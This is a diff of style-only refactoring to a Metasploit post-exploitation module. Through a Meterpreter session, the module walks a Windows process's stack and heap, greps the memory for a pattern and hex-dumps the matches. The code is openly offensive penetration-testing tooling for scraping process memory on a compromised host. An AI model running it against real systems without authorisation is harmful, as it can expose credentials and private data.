@@ -60,7 +60,7 @@ class MetasploitModule < Msf::Post
           'Data' => data
         }
       end
-    rescue
+    rescue StandardError
     end
 
     stack
@@ -77,36 +77,38 @@ class MetasploitModule < Msf::Post
 
     heap_cnt = session.railgun.kernel32.GetProcessHeaps(nil, nil)['return']
     dheap = session.railgun.kernel32.GetProcessHeap()['return']
-    vprint_status("Default Process Heap: 0x%08x" % dheap)
+    vprint_status('Default Process Heap: 0x%08x' % dheap)
     ret = session.railgun.kernel32.GetProcessHeaps(heap_cnt, heap_cnt * 4)
     pheaps = ret['ProcessHeaps']
 
     idx = 0
     handles = []
     while idx != pheaps.length
-      vprint_status("Found Heap: 0x%08x" % pheaps[idx, 4].unpack('V')[0])
+      vprint_status('Found Heap: 0x%08x' % pheaps[idx, 4].unpack('V')[0])
       handles << pheaps[idx, 4].unpack('V')[0]
       idx += 4
     end
 
-    print_status("Walking the heap... this could take some time")
+    print_status('Walking the heap... this could take some time')
     heap = []
     handles.each do |handle|
       lpentry = "\x00" * 42
       ret = ''
-      while (ret = session.railgun.kernel32.HeapWalk(handle, lpentry)) and ret['return']
+      while (ret = session.railgun.kernel32.HeapWalk(handle, lpentry)) && ret['return']
         entry = ret['lpEntry'][0, 4].unpack('V')[0]
         pointer = proc.memory.read(entry, 512)
         size = ret['lpEntry'][4, 4].unpack('V')[0]
         data = proc.memory.read(entry, (size == 0) ? 1048576 : size)
-        heap << {
-          'Address' => entry,
-          'Size' => data.length,
-          'Handle' => handle,
-          'Data' => data
-        } if data.length > 0
+        if !data.empty?
+          heap << {
+            'Address' => entry,
+            'Size' => data.length,
+            'Handle' => handle,
+            'Data' => data
+          }
+        end
         lpentry = ret['lpEntry']
-        break if ret['GetLastError'] == 259 or size == 0
+        break if (ret['GetLastError'] == 259) || (size == 0)
       end
     end
 
@@ -119,13 +121,13 @@ class MetasploitModule < Msf::Post
     get_data_from_stack(target_pid).each do |mem|
       idx = mem['Data'].index(regex)
 
-      if idx != nil
-        print_status("Match found on stack!")
-        print_line
-        data = mem['Data'][idx, 512]
-        addr = mem['Address'] + idx
-        print_line(Rex::Text.to_hex_dump(data, 16, addr))
-      end
+      next if idx.nil?
+
+      print_status('Match found on stack!')
+      print_line
+      data = mem['Data'][idx, 512]
+      addr = mem['Address'] + idx
+      print_line(Rex::Text.to_hex_dump(data, 16, addr))
     end
 
     # Grep from heap is optional.  If the 'HEAP' option isn't set,
@@ -135,19 +137,19 @@ class MetasploitModule < Msf::Post
     get_data_from_heap(target_pid).each do |mem|
       idx = mem['Data'].index(regex)
 
-      if idx != nil
-        print_status("Match found on heap!")
-        print_line
-        data = mem['Data'][idx, 512]
-        addr = mem['Address'] + idx
-        print_line(Rex::Text.to_hex_dump(data, 16, addr))
-      end
+      next if idx.nil?
+
+      print_status('Match found on heap!')
+      print_line
+      data = mem['Data'][idx, 512]
+      addr = mem['Address'] + idx
+      print_line(Rex::Text.to_hex_dump(data, 16, addr))
     end
   end
 
   def run
-    if session.type != "meterpreter"
-      print_error "Only meterpreter sessions are supported by this post module"
+    if session.type != 'meterpreter'
+      print_error 'Only meterpreter sessions are supported by this post module'
       return
     end
 
@@ -169,7 +171,7 @@ class MetasploitModule < Msf::Post
     print_status("PIDs found for #{proc_name}: #{pids * ', '}")
 
     pids.each do |pid|
-      print_status("Searching in process: #{pid.to_s}...")
+      print_status("Searching in process: #{pid}...")
       dump_data(pid)
       print_line
     end
